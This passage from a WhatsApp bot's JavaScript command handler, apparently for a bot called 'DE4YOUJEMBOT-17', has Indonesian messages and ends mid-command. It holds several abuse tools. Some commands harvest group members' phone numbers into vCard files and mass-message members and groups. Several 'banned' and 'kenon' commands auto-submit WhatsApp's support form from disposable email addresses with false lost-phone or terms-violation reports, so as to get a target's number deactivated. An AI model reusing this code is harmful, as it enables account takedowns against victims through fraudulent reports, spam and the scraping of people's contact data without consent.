reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "addprem1":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem1":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case "addprem2":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premiumm.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem2":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premiumm.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case 'premlist1':{
if (!isOwner) return reply(mess.owner)
let listprem =`*LIST SELER DE4YOUJEMBOT-17 OFFCIAL*\n\nTotal Seller : ${owner.length}\n`
var no = 1
for (let x of owner) {
listprem +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listprem +=`Untuk Menghapus Akses Prem Ketik ${prefix}delprem1 628xxx/@tag`
Biiofc.sendMessage(m.chat, {text: listprem },{quoted: Biiofc.chat})
}
break
case 'premlist2':{
if (!isOwner) return reply(mess.owner)
let listpremm =`*LIST SELER DE4YOUJEMBOT-17 OFFCIAL*\n\nTotal Seller : ${owner.length}\n`
var no = 1
for (let x of owner) {
listpremm +=`\nUser: ${no++}\nID: ${x}\n\n`
}
listpremm +=`Untuk Menghapus Akses Prem Ketik ${prefix}delprem2 628xxx/@tag`
Biiofc.sendMessage(m.chat, {text: listpremm },{quoted: Biiofc.chat})
}
break
case "cekidgc": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await Biiofc.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break

case "listgroup":{
if (!isOwner) return reply(`Ngapain ? Khusus De4you Offcial Aja !!`)
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let hituet = 0
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await Biiofc.groupMetadata(x)
teks += `❏ Group Ke ${hituet+=1}\n│⭔ *NAMA :* ${metadata2.subject}\n│⭔ *ID :* ${metadata2.id}\n│⭔ *MEMBER :* ${metadata2.participants.length}\n╰────|\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontakv1 id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu ID Group Nya Di Atas`)
}
break
case "pushkontakv1":{
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
reply(mess.wait)
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await Biiofc.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await Biiofc.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
reply(mess.wait)
const groupMetadata = isGroup? await Biiofc.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await Biiofc.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv3":
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("Otw Boskuuu")
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await Biiofc.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Succes Boss!")
break
case "pushkontakv4":
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
await reply("Otw Boskuuu")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await Biiofc.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Succes Boss!")
break
case "savecontactv1": {
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!text) return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadata = isGroup? await Biiofc.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
reply("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./data/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'getcontact': case 'getkontak':
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
huhuhs = await Biiofc.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
Biiofc.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break
case 'savekontak': case 'svkontak':
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!isGroup) return m.reply(`Khusus Group Kontol`)
let cmiggc = await Biiofc.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
Biiofc.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'sendkontak': case 'kontak':
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!isGroup) return m.reply(`Khusus Group`)
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
Biiofc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break
case "savecontactv2": {
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(from, { document: fs.readFileSync("./data/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./data/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'bcvideo': case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
        if (!q) return reply(`*Enter Text*`)
        let getGroups = await Biiofc.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        reply(`\`\`\`Broadcasting in\`\`\` *${xeoncast.length}* \`\`\`Group Chat, in\`\`\` *${xeoncast.length * 1.5} seconds*`)
        for (let i of xeoncast) {
let txt = `*${global.ownerName}'s Broadcast*\n\n\`\`\`Message :\`\`\` *${q}*`
if(/image/.test(mime)) {
let media = await quoted.download()
await Biiofc.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await Biiofc.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        reply(`\`\`\`Successfuly Broadcasted in\`\`\` *${xeoncast.length} Groups*`)      
        break
case 'remini':
			case 'hd': {
			if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (!quoted) return reply(`Fotonya Mana?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			reply(mess.wait)
			let media = await quoted.download()
			let proses = await remini(media, "enhance");
			Biiofc.sendMessage(m.chat, { image: proses, caption: '🍁 Ini Hasilnya Kak...'}, { quoted: m})
			await sleep(5000)
			}
			break
case 'enc': {
            if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
            if (!q) return reply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await obfus(q)
            reply(`${meg.result}`)
        }
        break
case 'join': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!q) return reply(`Kirim perintah ${prefix+command} *_Link Grup Nya Tuan?🤔_*`)
var ini_urrrl = q.split('https://chat.whatsapp.com/')[1]
var data = await Biiofc.groupAcceptInvite(ini_urrrl)
m.reply('*Sukses Join Ke Grup Tuan✅*')
}
break
case 'bcgc': case 'bcgroup': {
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} De4youOffcial`
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
Biiofc.sendMessage(i, {text: `${text}`}, {quoted:fkontak})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case "jpm":{
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Biiofc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0]})
await sleep(text.split('|')[1])
} else {
await Biiofc.sendMessage(xnxx, { text: text.split('|')[0]})
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN DE4YOUJEMBOT-17✅*")
}
break
case "jpmtag":{
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Biiofc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Biiofc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN DE4YOUJEMBOT-17✅*")
}
break
case "out": case "verif":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv1": case "kenon":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
